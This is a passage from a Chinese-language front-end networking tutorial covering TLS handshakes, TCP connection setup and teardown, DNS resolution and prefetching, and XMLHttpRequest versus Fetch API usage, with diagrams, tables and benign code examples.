Client->>Server: [Finished]    Note over Client,Server: 后续通信使用会话密钥对称加密</pre><p><strong>证书验证机制</strong></p><table><thead><tr><th align="left">验证环节</th><th align="left">技术原理</th></tr></thead><tbody><tr><td align="left">证书链信任</td><td align="left">客户端预置根 CA 证书 -&gt; 验证中间 CA 签名 -&gt; 验证服务器证书签名</td></tr><tr><td align="left">域名检查</td><td align="left">检查服务器返回证书里的 subject alternative name（SAN） 或 common name（CN） 是否与访问域名一致</td></tr><tr><td align="left">吊销检查</td><td align="left">通过 OCSP （在线证书状态协议）或 CRL （证书吊销列表）验证证书有效性</td></tr></tbody></table><p><strong>混合加密优势</strong></p><table><thead><tr><th align="left">阶段</th><th align="left">技术</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">握手阶段</td><td align="left">非对称加密</td><td align="left">安全传输会话密钥（防窃听）</td></tr><tr><td align="left">数据传输阶段</td><td align="left">对称加密</td><td align="left">高性能加密业务数据（千倍于非对称）</td></tr></tbody></table><p><strong>前端关键影响</strong></p><ul><li>安全实践：<ul><li>必须使用 HTTPS 访问所有资源（避免混合内容警告）</li><li>使用 <code>Strict-Transport-Security</code> 头强制 HTTPS</li></ul></li><li>性能优化：<ul><li>启用 TLS 会话复用（session resumption），减少握手开销</li><li>使用 ECDHE 密钥交换（前向保密）</li></ul></li></ul><h2 id="1-2-TCP-UDP基础"><a href="#1-2-TCP-UDP基础" class="headerlink" title="1.2 TCP&#x2F;UDP基础"></a>1.2 TCP&#x2F;UDP基础</h2><h3 id="三次握手与四次挥手流程"><a href="#三次握手与四次挥手流程" class="headerlink" title="三次握手与四次挥手流程"></a>三次握手与四次挥手流程</h3><p><strong>三次握手（连接建立）</strong></p><p>流程图解：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Note left of Client: CLOSED → SYN_SENT    Client->>Server: SYN=1, seq=x (随机序列号)    Note right of Server: LISTEN → SYN_RCVD    Server->>Client: SYN=1, ACK=1, seq=y, ack=x+1    Note left of Client: SYN_SENT → ESTABLISHED    Client->>Server: ACK=1, seq=x+1, ack=y+1    Note right of Server: SYN_RCVD → ESTABLISHED</pre><p>核心步骤：</p><ul><li>第一次握手<ul><li>客户端发送 SYN&#x3D;1（同步标志）和随机序列号 seq&#x3D;x</li><li>状态变化：客户端进入 SYN_SENT</li></ul></li><li>第二次握手<ul><li>服务器返回 SYN&#x3D;1 + ACK&#x3D;1（确认标志），携带自己的序列号 seq&#x3D;y 和确认号 ack&#x3D;x+1</li><li>状态变化：服务器进入 SYN_RCVD</li></ul></li><li>第三次握手<ul><li>客户端发送 ACK&#x3D;1，确认号 ack&#x3D;y+1</li><li>状态变化：双方进入 ESTABLISHED</li></ul></li></ul><p>设计目的：</p><ul><li>确认双方的收发能力正常</li><li>同步初始序列号（防历史链接混乱）</li></ul><p><strong>四次挥手（连接释放）</strong></p><p>流程图解：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Note left of Client: ESTABLISHED → FIN_WAIT_1    Client->>Server: FIN=1, seq=u    Note right of Server: ESTABLISHED → CLOSE_WAIT    Server->>Client: ACK=1, ack=u+1    Note left of Client: FIN_WAIT_1 → FIN_WAIT_2    Server->>Client: FIN=1, seq=v, ack=u+1    Note right of Server: CLOSE_WAIT → LAST_ACK    Client->>Server: ACK=1, ack=v+1    Note left of Client: FIN_WAIT_2 → TIME_WAIT (2MSL后CLOSED)    Note right of Server: LAST_ACK → CLOSED</pre><p>核心步骤：</p><ul><li>第一次挥手<ul><li>主动方发送 FIN&#x3D;1（结束标志）和序列号 seq&#x3D;u</li><li>状态变化：主动方进入 FIN_WAIT_1</li></ul></li><li>第二次挥手<ul><li>被动方返回 ACK&#x3D;1 和确认号 ack&#x3D;u+1</li><li>状态变化：被动方进入 CLOSE_WAIT（半关闭状态）</li></ul></li><li>第三次挥手<ul><li>被动方发送自己的 FIN&#x3D;1 和序列号 seq&#x3D;v</li><li>状态变化：被动方进入 LAST_ACK</li></ul></li><li>第四次挥手<ul><li>主动方发送 ACK&#x3D;1 和确认号 ack&#x3D;v+1</li><li>状态变化：主动方进入 TIME_WAIT（等待2MSL后关闭）</li></ul></li></ul><p>关键机制：</p><ul><li>TIME_WAIT状态：<ul><li>持续2MSL（报文最大生存时间，通常1-4分钟）</li><li>目的：确保最后一个 ACK 到达 + 让网络中残留报文失效</li></ul></li><li>半关闭状态：被动方可在 CLOSE_WAIT 阶段继续发送数据</li></ul><p><strong>与 HTTP 协议的关系</strong></p><ul><li>HTTP&#x2F;1.1：三次握手后完成单个请求-响应，默认 Connection: keep-alive 复用 TCP 连接</li><li>连接开销：高频短连接场景（如HTTP&#x2F;1.0）会因反复握手&#x2F;挥手导致性能下降</li></ul><h3 id="连接复用（Keep-Alive）与队头阻塞问题"><a href="#连接复用（Keep-Alive）与队头阻塞问题" class="headerlink" title="连接复用（Keep-Alive）与队头阻塞问题"></a>连接复用（Keep-Alive）与队头阻塞问题</h3><p><strong>连接复用（Keep-Alive）</strong></p><p>定义：通过复用同一个 TCP 连接处理多个 HTTP 请求&#x2F;响应，避免重复的三次握手和四次挥手，降低延迟和资源消耗。</p><p>工作原理：</p><ul><li>HTTP&#x2F;1.1：默认启用Connection: keep-alive，允许复用连接。</li><li>HTTP头部控制：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive  // 启用复用<br><span class="hljs-attribute">Keep-Alive</span><span class="hljs-punctuation">: </span>timeout=5, max=100  // 空闲超时5秒，最多复用100次请求<br></code></pre></td></tr></table></figure><p>优势：</p><ul><li>减少 TCP 握手&#x2F;挥手开销（节省1-2 RTT&#x2F;请求）</li><li>降低服务器和客户端资源占用（减少 Socket 创建和销毁）</li></ul><p>示例流程：</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: GET /page1 HTTP/1.1 (Connection: keep-alive)    Server->>Client: HTTP/1.1 200 OK (Connection: keep-alive)    Client->>Server: GET /page2 HTTP/1.1 (复用同一TCP连接)    Server->>Client: HTTP/1.1 200 OK</pre><p><strong>队头阻塞（Head-of-Line Blocking）</strong></p><p>定义：当单个 TCP 连接中的前一个请求未完成时，后续请求必须等待，即使它们彼此独立。</p><p>两种类型：</p><ul><li>TCP 层队头阻塞<ul><li>原因：TCP 保证数据有序交付，丢失包会阻塞后续包的重传。</li><li>影响：即使HTTP&#x2F;2复用连接，仍受底层TCP限制。</li></ul></li><li>HTTP&#x2F;1.1层队头阻塞<ul><li>原因：HTTP&#x2F;1.1的管道化（pipelining）请求必须按顺序返回响应。</li><li>示例：</li></ul></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">GET /resource1  // 慢请求<br>GET /resource2  // 被阻塞直到resource1完成<br></code></pre></td></tr></table></figure><p>解决方案：</p><ul><li>HTTP&#x2F;2：引入多路复用（Multiplexing），通过二进制分帧层实现并行请求。</li><li>HTTP&#x2F;3：基于QUIC协议（UDP），彻底解决TCP层队头阻塞。</li></ul><p><strong>对比总结</strong></p><table><thead><tr><th align="left">特性</th><th align="left">连接复用（Keep-Alive）</th><th align="left">队头阻塞问题</th></tr></thead><tbody><tr><td align="left">作用层级</td><td align="left">HTTP&#x2F;1.1及以上</td><td align="left">TCP层 + HTTP&#x2F;1.1管道化</td></tr><tr><td align="left">主要优化</td><td align="left">减少握手开销</td><td align="left">需HTTP&#x2F;2或QUIC解决</td></tr><tr><td align="left">性能影响</td><td align="left">提升短连接场景性能</td><td align="left">高延迟环境下性能下降显著</td></tr></tbody></table><p><strong>前端优化实践</strong></p><ol><li>HTTP&#x2F;1.1优化：使用多个域名（分片）绕过浏览器对单域名连接数的限制（通常6-8个）</li><li>升级协议：优先使用HTTP&#x2F;2（多路复用）或HTTP&#x2F;3（QUIC）。</li><li>资源合并：减少请求数量（如CSS&#x2F;JS合并），降低队头阻塞影响。</li></ol><h2 id="1-3-DNS解析机制"><a href="#1-3-DNS解析机制" class="headerlink" title="1.3 DNS解析机制"></a>1.3 DNS解析机制</h2><h3 id="域名解析流程（递归查询-权威解析）"><a href="#域名解析流程（递归查询-权威解析）" class="headerlink" title="域名解析流程（递归查询&#x2F;权威解析）"></a>域名解析流程（递归查询&#x2F;权威解析）</h3><p><strong>核心流程步骤</strong></p><pre class="mermaid">sequenceDiagram    participant User    participant LocalDNS as 本地DNS<br>(递归解析器)    participant RootDNS as 根DNS    participant TLDNS as 顶级域DNS<br>(如.com)    participant AuthDNS as 权威DNS<br>(如example.com)        User->>LocalDNS: 查询 www.example.com    alt 缓存命中        LocalDNS-->>User: 直接返回IP (缓存)    else 递归查询        LocalDNS->>RootDNS: 请求 .com 的TLD地址        RootDNS-->>LocalDNS: 返回 .com TLD地址        LocalDNS->>TLDNS: 请求 example.com 权威服务器        TLDNS-->>LocalDNS: 返回 example.com NS记录        LocalDNS->>AuthDNS: 请求 www.example.com A记录        AuthDNS-->>LocalDNS: 返回IP地址        LocalDNS->>User: 返回最终IP    end</pre><p><strong>递归查询（Recursive Query）</strong></p><ul><li>发起者：客户端（浏览器&#x2F;操作系统） → 本地 DNS 服务器</li><li>特点：<ul><li>客户端只发送一次请求</li><li>本地 DNS 负责完整解析流程，最终返回IP或错误</li></ul></li><li>客户端要求：<code>dig +recursive www.example.com</code></li></ul><p><strong>权威解析（Authoritative Resolution）</strong></p><ul><li>执行者：权威 DNS 服务器（管理特定域名的 DNS 记录）</li><li>记录类型：</li></ul><table><thead><tr><th align="left">记录</th><th align="left">作用</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">A</td><td align="left">IPv4地址</td><td align="left"><a href="http://www.example.com/">www.example.com</a>. 300 IN A 192.0.2.1</td></tr><tr><td align="left">AAAA</td><td align="left">IPv6地址</td><td align="left">… IN AAAA 2001:db8::1</td></tr><tr><td align="left">NS</td><td align="left">指定域名的权威服务器</td><td align="left">example.com. IN NS ns1.example.com</td></tr><tr><td align="left">CNAME</td><td align="left">域名别名</td><td align="left">www IN CNAME example.com</td></tr></tbody></table><p><strong>迭代查询（Iterative Query - 实际执行方式）</strong></p><ul><li>发生位置：本地 DNS 服务器 → 根&#x2F;TLD&#x2F;权威DNS</li><li>流程特点:<ol><li>本地 DNS 查询根 DNS（全球13组）获取 TLD 地址</li><li>查询TLD DNS（如.com注册局）获取权威 DNS</li><li>查询权威 DNS 获取最终A&#x2F;AAAA记录</li></ol></li><li>响应类型：<ul><li>非权威应答：返回下级 DNS 地址（转发）</li><li>权威应答：直接返回 IP（最终结果）</li></ul></li></ul><p><strong>缓存机制</strong></p><ul><li>本地DNS缓存：<ul><li>根据 TTL（Time-To-Live）缓存记录（如300秒）</li><li>减少全球 DNS 查询压力</li></ul></li><li>浏览器&#x2F;OS缓存：<ul><li>ipconfig &#x2F;displaydns（Windows）查看缓存</li><li>缓存过期后重新触发递归查询</li></ul></li></ul><p><strong>前端性能影响</strong></p><ul><li>优化手段：<ul><li>减少域名数量（降低 DNS 查询次数）</li><li>使用<code>&lt;link rel=&quot;dns-prefetch&quot;&gt;</code>预解析关键域名</li></ul></li><li>安全机制：<ul><li>DNSSEC：防止 DNS 欺骗（数字签名验证）</li><li>DoH&#x2F;DoT：加密 DNS 查询（防止监听）</li></ul></li></ul><h3 id="DNS预取（dns-prefetch）与缓存优化"><a href="#DNS预取（dns-prefetch）与缓存优化" class="headerlink" title="DNS预取（dns-prefetch）与缓存优化"></a>DNS预取（dns-prefetch）与缓存优化</h3><p><strong>DNS预取（dns-prefetch）</strong></p><p>定义：浏览器提前解析后续页面可能访问的域名，将 DNS 查询与页面渲染并行执行，减少用户感知延迟。</p><p>实现方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 在HTML头部声明需预取的域名 --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//cdn.example.com&quot;&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//api.example.com&quot;&gt;<br></code></pre></td></tr></table></figure><p>工作流程：</p><ol><li>浏览器解析 HTML 时发现 dns-prefetch 标签</li><li>后台启动 DNS 查询（不阻塞页面渲染）</li><li>结果缓存至 DNS 缓存池</li><li>实际请求资源时直接使用缓存 IP</li></ol><p>性能影响：</p><ul><li>典型DNS查询耗时：50-200ms</li><li>预取后延迟：≈0ms（命中缓存时）</li><li>适用场景：<ul><li>第三方资源（CDN、分析脚本）</li><li>多域名架构下的跨域请求</li></ul></li></ul><p><strong>DNS缓存优化机制</strong></p><p>缓存层级：</p><table><thead><tr><th align="left">层级</th><th align="left">缓存位置</th><th align="left">存活时间</th><th align="left">控制方式</th></tr></thead><tbody><tr><td align="left">浏览器</td><td align="left">内存缓存</td><td align="left">会话级（关闭标签页失效）</td><td align="left">自动管理</td></tr><tr><td align="left">操作系统</td><td align="left">系统DNS缓存</td><td align="left">遵循TTL（默认分钟~小时）</td><td align="left">ipconfig &#x2F;flushdns</td></tr><tr><td align="left">本地DNS</td><td align="left">递归解析器缓存</td><td align="left">严格遵循TTL</td><td align="left">ISP&#x2F;管理员配置</td></tr></tbody></table><p>TTL（Time-To-Live）核心作用：</p><ul><li>DNS记录中设置的有效期（秒）：<code>example.com. 300 IN A 192.0.2.1 # TTL=300秒</code></li><li>平衡矛盾：<ul><li>高TTL（数小时）：减少查询次数，提升速度</li><li>低TTL（秒级）：快速更新DNS记录（如故障转移）</li></ul></li></ul><p>缓存刷新策略：</p><ul><li>前端无法直接控制，但可通过以下方式间接优化：<ul><li>关键域名使用稳定IP（避免频繁变更）</li><li>迁移到HTTP&#x2F;2+减少域名分片（降低DNS查询需求）</li></ul></li></ul><p><strong>联合优化实践</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 步骤1: 预取关键域名 --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//static.example.com&quot;&gt;<br><br>&lt;!-- 步骤2: 预连接（DNS+TCP+TLS三合一优化） --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;//api.example.com&quot; crossorigin&gt;<br></code></pre></td></tr></table></figure><blockquote><p>preconnect：提前完成DNS+TCP握手+TLS协商（节省3-4次RTT）</p></blockquote><h1 id="二、网络请求技术"><a href="#二、网络请求技术" class="headerlink" title="二、网络请求技术"></a>二、网络请求技术</h1><h2 id="2-1-请求处理"><a href="#2-1-请求处理" class="headerlink" title="2.1 请求处理"></a>2.1 请求处理</h2><h3 id="AJAX原理与XMLHttpRequest对象"><a href="#AJAX原理与XMLHttpRequest对象" class="headerlink" title="AJAX原理与XMLHttpRequest对象"></a>AJAX原理与XMLHttpRequest对象</h3><p><strong>AJAX 核心原理</strong></p><p>定义：Asynchronous JavaScript and XML（异步JavaScript和XML），通过浏览器内置对象在不刷新页面的情况下与服务器交换数据并更新部分网页内容。</p><p>工作流程：</p><pre class="mermaid">sequenceDiagram    participant User    participant Browser    participant Server    User->>Browser: 触发事件（点击/滚动等）    Browser->>Server: 发送异步请求（XHR对象）    Server->>Browser: 返回数据（JSON/XML/Text）    Browser->>Browser: 解析数据 -> 更新DOM    Browser-->>User: 局部刷新页面</pre><p>关键特性：</p><ul><li>异步通信：不阻塞用户界面（对比传统表单提交）</li><li>数据格式：现代应用主要用JSON替代XML</li><li>同源策略：默认只能请求相同协议&#x2F;域名&#x2F;端口的资源（可通过CORS解除）</li></ul><p><strong>XMLHttpRequest（XHR）对象详解</strong></p><p>创建与初始化：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();  <span class="hljs-comment">// 创建实例</span><br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 初始化（方法, URL, 异步）</span><br></code></pre></td></tr></table></figure><p>核心方法：</p><table><thead><tr><th align="left">方法</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">.open(method, url, async)</td><td align="left">配置请求类型、地址、异步标志</td></tr><tr><td align="left">.send([body])</td><td align="left">发送请求（可选请求体如JSON）</td></tr><tr><td align="left">.setRequestHeader(name, value)</td><td align="left">设置请求头（如Content-Type）</td></tr><tr><td align="left">.abort()</td><td align="left">终止请求</td></tr></tbody></table><p>关键属性：</p><table><thead><tr><th align="left">属性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">.readyState</td><td align="left">请求状态（0-4）</td></tr><tr><td align="left">.status</td><td align="left">HTTP状态码（如200, 404）</td></tr><tr><td align="left">.responseText</td><td align="left">文本响应数据</td></tr><tr><td align="left">.responseXML</td><td align="left">XML格式响应（已淘汰）</td></tr><tr><td align="left">.responseType</td><td align="left">指定响应格式（如json）</td></tr></tbody></table><p>事件监听（异步处理）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>));<br>  &#125;<br>&#125;;<br><span class="hljs-comment">// 或使用现代事件监听</span><br>xhr.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.<span class="hljs-property">status</span> &lt; <span class="hljs-number">300</span>) &#123;<br>    <span class="hljs-comment">// 成功处理</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>Ajax 技术演进：</p><table><thead><tr><th align="left">技术阶段</th><th align="left">典型实现</th><th align="left">缺陷</th></tr></thead><tbody><tr><td align="left">原生XHR</td><td align="left">new XMLHttpRequest()</td><td align="left">回调地狱、繁琐错误处理</td></tr><tr><td align="left">jQueryAJAX</td><td align="left">$.ajax({ … })</td><td align="left">依赖jQuery库</td></tr><tr><td align="left">Fetch API</td><td align="left">fetch(url).then(…)</td><td align="left">更简洁的Promise方案</td></tr></tbody></table><p><strong>前端开发关键点</strong></p><p>（1）错误处理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* 网络错误处理 */</span> &#125;;<br>xhr.<span class="hljs-property">ontimeout</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* 超时处理 */</span> &#125;;<br></code></pre></td></tr></table></figure><p>（2）Content-Type 设置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;));<br></code></pre></td></tr></table></figure><p>（3）跨域请求</p><ul><li>需服务器设置Access-Control-Allow-Origin</li><li>可通过代理服务器转发</li></ul><h3 id="Fetch-API及与XHR对比"><a href="#Fetch-API及与XHR对比" class="headerlink" title="Fetch API及与XHR对比"></a>Fetch API及与XHR对比</h3><p><strong>Fetch API 核心原理</strong></p><p>定义：基于 Promise 的现代网络请求接口，替代传统 XMLHttpRequest（XHR），提供更简洁、强大的请求处理能力。</p><p>基本语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">fetch</span>(url, options)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network error&#x27;</span>);<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>(); <span class="hljs-comment">// 解析JSON响应</span><br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));<br></code></pre></td></tr></table></figure><p>核心特性：</p><table><thead><tr><th align="left">特性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">Promise 驱动</td><td align="left">链式调用替代回调嵌套，支持 async&#x2F;await</td></tr><tr><td align="left">流式数据处理</td><td align="left">响应体可分段读取（response.body），支持大文件处理</td></tr><tr><td align="left">默认不携带Cookie</td><td align="left">需显式设置 credentials: ‘include’</td></tr><tr><td align="left">更灵活的配置</td><td align="left">通过 init 对象配置所有参数</td></tr><tr><td align="left">内置响应类型</td><td align="left">支持 response.json()&#x2F;.text()&#x2F;.blob()&#x2F;.arrayBuffer() 等转换方法</td></tr></tbody></table><p>完整配置项：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">fetch</span>(url, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,          <span class="hljs-comment">// GET/POST/PUT/DELETE</span><br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Bearer token&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data), <span class="hljs-comment">// 支持多种数据类型</span><br>  <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>,   <span class="hljs-comment">// 携带Cookie</span><br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;cors&#x27;</span>,             <span class="hljs-comment">// 跨域模式</span><br>  <span class="hljs-attr">cache</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,        <span class="hljs-comment">// 缓存控制</span><br>  <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;follow&#x27;</span>        <span class="hljs-comment">// 重定向策略</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Fetch API 与 XHR 关键对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">Fetch API</th><th align="left">XMLHttpRequest (XHR)</th></tr></thead><tbody><tr><td align="left">设计理念</td><td align="left">Promise 驱动的现代化 API</td><td align="left">基于事件的旧式 API</td></tr><tr><td align="left">语法复杂度</td><td align="left">简洁（链式调用）</td><td align="left">冗长（事件监听 + 状态检查）</td></tr><tr><td align="left">错误处理</td><td align="left">只对网络错误 reject（HTTP 404&#x2F;500 需手动处理）</td><td align="left">通过 status 检测所有错误</td></tr><tr><td align="left">超时控制</td><td align="left">需结合 AbortController 实现</td><td align="left">原生支持 timeout 属性</td></tr><tr><td align="left">进度追踪</td><td align="left">无原生进度事件</td><td align="left">支持 progress 事件（上传&#x2F;下载）</td></tr><tr><td align="left">请求取消</td><td align="left">通过 AbortController.abort()</td><td align="left">原生 xhr.abort()</td></tr><tr><td align="left">Cookie 策略</td><td align="left">默认不发送（更安全）</td><td align="left">默认发送（需手动禁止）</td></tr><tr><td align="left">响应类型处理</td><td align="left">通过方法转换（如 .json()）</td><td align="left">通过属性访问（如 responseText）</td></tr><tr><td align="left">跨域请求</td><td align="left">默认遵循 CORS</td><td align="left">同样遵循 CORS</td></tr></tbody></table><p><strong>典型场景代码对比</strong></p><p>（1）GET 请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data));<br><br><span class="hljs-comment">// XHR</span><br><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>xhr.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>));<br>xhr.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><p>（2）POST 请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/submit&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;)<br>&#125;);<br><br><span class="hljs-comment">// XHR</span><br><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/api/submit&#x27;</span>);<br>xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;));<br></code></pre></td></tr></table></figure><p>（3）错误处理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch (需手动处理HTTP错误)</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">400</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span 